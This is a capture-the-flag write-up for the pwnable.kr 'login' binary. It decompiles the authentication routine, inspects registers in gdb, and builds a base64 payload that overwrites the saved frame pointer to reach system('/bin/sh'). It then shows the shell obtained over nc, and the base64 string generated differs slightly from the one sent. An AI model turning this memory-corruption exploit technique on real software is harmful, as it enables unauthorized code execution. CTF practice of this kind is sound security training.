## discomp in hopper

## main
```
int main() {
    sub_80482e0();
    _IO_setvbuf(_IO_2_1_stdout_, 0x0, 0x2);
    _IO_setvbuf(_IO_2_1_stdin_, 0x0, 0x1);
    _IO_printf("Authenticate : ", 0x0);
    __isoc99_scanf();
    sub_80482e0();
    stack[2031] = ((esp & 0xfffffff0) - 0x40) + 0x1e;
    Base64Decode(stack[2031], ((esp & 0xfffffff0) - 0x40) + 0x18);
    if (*(((esp & 0xfffffff0) - 0x40) + 0x3c) <= 0xc) {
            memcpy(0x811eb40, stack[2031], stack[2031]);
            if (auth(0x811eb40) == 0x1) {
                    correct();
            }
    }
    else {
            _IO_puts("Wrong Length");
    }
    return 0x0;
}
```

=> 
```
if(input < 12){
    Base64Decode
    if( auth ){
        correct()!!
    }
}
```

## correct


```
int correct() {
    if (*0x811eb40 == 0xdeadbeef) {
            _IO_puts("Congratulation! you are good!");
            __libc_system("/bin/sh");
    }
    eax = exit(0x0);
    return eax;
}

```

if 0x811eb40 is deadbeef => /bin/sh 



## auth
```

int auth(int arg0) {
    memcpy(var_14 + 0xc, 0x811eb40, arg0);
    var_C = calc_md5(var_14, 0xc);
    _IO_printf("hash : %s\n", var_C);
    if (strcmp("f87cd601aa7fedca99018a8be88eda34", var_C) == 0x0) {
            eax = 0x1;
    }
    else {
            eax = 0x0;
    }
    return eax;
}
```

strcmp("f87cd601aa7fedca99018a8be88eda34",calc_md5(0x811eb40,arg0) ) == 0x0 => OK! 

=> impossible

```
memcpy(var_14 + 0xc, 0x811eb40, arg0);
```
=> 0x811eb40 

arg0 -> 0x811eb40


```
$ gdb ./login -q
Reading symbols from ./login...(no debugging symbols found)...done.
gdb-peda$ b *0x08049424
Breakpoint 1 at 0x8049424
gdb-peda$ r
Starting program: /home/ubuntu/ctf/login 
Authenticate : ABCDEFGHIJKL
hash : 760aa6e92148e1cff7380e48de3e535c
 [----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x80481d0 (<_init>:	push   ebx)
ECX: 0x37 ('7')
EDX: 0x80da684 ("f87cd601aa7fedca99018a8be88eda34")
ESI: 0x0 
EDI: 0x811b00c --> 0x80a6470 (<__stpcpy_sse2>:	mov    edx,DWORD PTR [esp+0x4])
EBP: 0xffffd48b --> 0x49407ff 
ESP: 0xffffd490 --> 0x9 ('\t')
EIP: 0x8049424 (<main+279>:	leave)
EFLAGS: 0x200297 (CARRY PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8049413 <main+262>:	mov    DWORD PTR [esp],0x80da6ba
   0x804941a <main+269>:	call   0x805c2d0 <puts>
   0x804941f <main+274>:	mov    eax,0x0
=> 0x8049424 <main+279>:	leave  
   0x8049425 <main+280>:	ret    
   0x8049426:	xchg   ax,ax
   0x8049428:	xchg   ax,ax
   0x804942a:	xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xffffd490 --> 0x9 ('\t')
0004| 0xffffd494 --> 0x81209b8 --> 0x10831000 
0008| 0xffffd498 --> 0x9 ('\t')
0012| 0xffffd49c --> 0x0 
0016| 0xffffd4a0 --> 0x1 
0020| 0xffffd4a4 --> 0xffffd564 --> 0xffffd6aa ("/home/ubuntu/ctf/login")
0024| 0xffffd4a8 --> 0x81209b8 --> 0x10831000 
0028| 0xffffd4ac --> 0x42410001 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08049424 in main ()
```

=> get eip


```
$ python -c "print '\n'+ ( '\xef\xbe\xad\xde' + '\x5f\x92\x04\x08' + '\x40\xeb\x11\x08' ).encode('base64')"  

776t3l+SBAhA6xEI

ubuntu@ubuntu:~/ctf$ nc pwnable.kr 9003
Authenticate : 776t3oSSBAhA6xEI
hash : 6f2932d96ee8185299bd3a31f1114593
ls
flag
log
login
super.pl
cat flag
control EBP, control ESP, control EIP, control the world~


```

